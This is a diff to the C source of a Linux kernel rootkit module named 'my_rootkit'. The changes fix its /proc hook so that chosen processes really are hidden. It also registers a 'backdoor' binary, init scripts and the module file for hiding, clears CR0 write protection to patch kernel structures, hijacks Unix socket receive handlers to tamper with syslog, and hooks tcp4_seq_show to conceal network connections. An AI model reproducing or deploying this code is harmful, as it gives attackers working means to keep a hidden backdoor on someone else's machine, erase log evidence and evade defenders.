@@ -212,40 +212,6 @@ static struct task_struct* get_task(pid_t pid)
     }
     return NULL;
 }
-#if 0
-static char* get_name(struct task_struct *p, char *buf)
-{
-    int i;
-    char *name = NULL;
-	unsigned char c;
-
-	if (NULL == p || NULL == buf) return NULL;
-	my_rootkit_debug("get_name task->comm=%s\n", p->comm);
-    name = p->comm;
-    i = sizeof(p->comm);
-    do {
-		c = *name;
-        name++;  i--;
-        *buf = c;
-        if (!c) break;
-        if (c == '\\') {
-            buf[1] = c;
-            buf += 2;
-            continue;
-        }
-        if (c == '\n')
-        {
-            buf[0] = '\\';
-            buf[1] = 'n';
-            buf += 2;
-            continue;
-        }
-        buf++;
-    } while (i);
-    *buf = '\n';
-    return buf + 1;
-}
-#endif
 static int get_process_name(char *process_name, pid_t pid)
 {
 	struct task_struct *task = NULL;
@@ -265,6 +231,7 @@ static int process_should_be_hidden(pid_t pid)
 
 	if (-1 == get_process_name(process_name, pid))//error
 		return -1;
+	//my_rootkit_debug("process_name: %s\n", process_name);
 	list_for_each_entry(hf, &hide_processes, list) {
 		if (strstr(process_name, hf->name)) {
 			return 1;
@@ -282,17 +249,12 @@ static int my_proc_filldir(void *buf, const char *name, int nlen, loff_t off, in
 	pid = myatoi((char*)name);
 	if (-1 == pid) { goto end; }
 
-	//my_rootkit_debug("process_name: %s\n", process_name);
 	//hide processes
 	if (orig_proc_filldir) {
 		if (name) {
-			if (0 == process_should_be_hidden(pid)) {
-			//list_for_each_entry(hf, &hide_processes, list) {
-				//if (strstr(process_name, hf->name)) {
-					my_rootkit_debug("vfs: successfully hide %s\n", name);
+			if (1 == process_should_be_hidden(pid)) {
+					my_rootkit_debug("proc: successfully hide %s\n", name);
 					return 0;
-				//}
-			//}
 			}
 		}
 end:
@@ -546,35 +508,12 @@ out:
 static int hack_syslog(void)
 {
 	struct socket *udp_sock = NULL, *tcp_sock = NULL;
-#if 0
-//#ifdef MODIFY_PAGE_TABLES
-	pgd_t *pgd = NULL;
-	pmd_t *pmd = NULL;
-	pte_t *pte = NULL, new_pte;
-//#ifdef FOUR_LEVEL_PAGING
-	pud_t *pud = NULL;
-//#endif
-//#endif
-#endif
 	
 	// PF_UNIX 1(linux/socket.h), SOCK_DGRAM 2 (linux/net.h)
 	//family: PF_UNIX 1  type: SOCK_STREAM 1 protocol: 
 	if (sock_create(PF_UNIX, SOCK_DGRAM, 0, &udp_sock) < 0) return -1;
 	if (sock_create(PF_UNIX, SOCK_STREAM, 0, &tcp_sock) < 0) return -1;
-#if 0
-//#ifdef MODIFY_PAGE_TABLES
-	pgd = pgd_offset_k((unsigned long)sock->ops);
-//#ifdef FOUR_LEVEL_PAGING
-	pud = pud_offset(pgd, (unsigned long)sock->ops);
-	pmd = pmd_offset(pud, (unsigned long)sock->ops);
-//#else
-//	pmd = pmd_offset(pgd, (unsigned long)sock->ops);
-//#endif
-	pte = pte_offset_kernel(pmd, (unsigned long)sock->ops);
-	new_pte = pte_mkwrite(*pte);
-	set_pte(pte, new_pte);
-//#endif /* Page-table stuff */
-#endif
+
 	if (udp_sock && (unix_dgram_ops = (struct proto_ops *)udp_sock->ops)) {
 		orig_unix_dgram_recvmsg = unix_dgram_ops->recvmsg;
 		unix_dgram_ops->recvmsg = my_unix_dgram_recvmsg;
@@ -662,12 +601,16 @@ static int __init my_rootkit_init(void)
 	
 	k_hide_file(&hide_files, "my_rootkit.ko");
 	k_hide_file(&hide_files, "remove_module.ko");
-	k_hide_file(&hide_files, "my_rootkit.sh");
-	k_hide_file(&hide_files, "my_rootkit_init.sh");
-	k_hide_file(&hide_files, "my_rootkit_sh");
-	k_hide_file(&hide_files, "S75my_rootkit");
 	k_hide_file(&hide_files, "backdoor");
+	//k_hide_file(&hide_files, "my_rootkit.sh");
+	k_hide_file(&hide_files, "exec_my_rootkit.sh");
+
+	k_hide_file(&hide_files, "my_rootkit_init.sh");
+	k_hide_file(&hide_files, "S75my_rootkit");
+	k_hide_file(&hide_files, "my_rootkit_sh");
+	
 	k_hide_file(&hide_processes, "backdoor");
+	k_hide_file(&hide_processes, "my_rootkit_sh");
 
 	cr0 = clear_cr0_save();
 	//hack root filesystem
@@ -682,6 +625,7 @@ static int __init my_rootkit_init(void)
 	//hide processes
 	if (-1 == hack_vfs(proc_fs, &orig_proc_readdir, my_proc_readdir))
 		my_rootkit_debug("Failed to hack proc readdir\n");	
+	//my_rootkit_debug("orig_root_readdir:%p,orig_etc_readdir:%p,orig_proc_readdir:%p\n",orig_root_readdir,orig_etc_readdir,orig_proc_readdir);
 	//hide net state
 	hack_tcp4_seq_show(&orig_tcp4_seq_show, my_tcp4_seq_show);	
 	//clean log
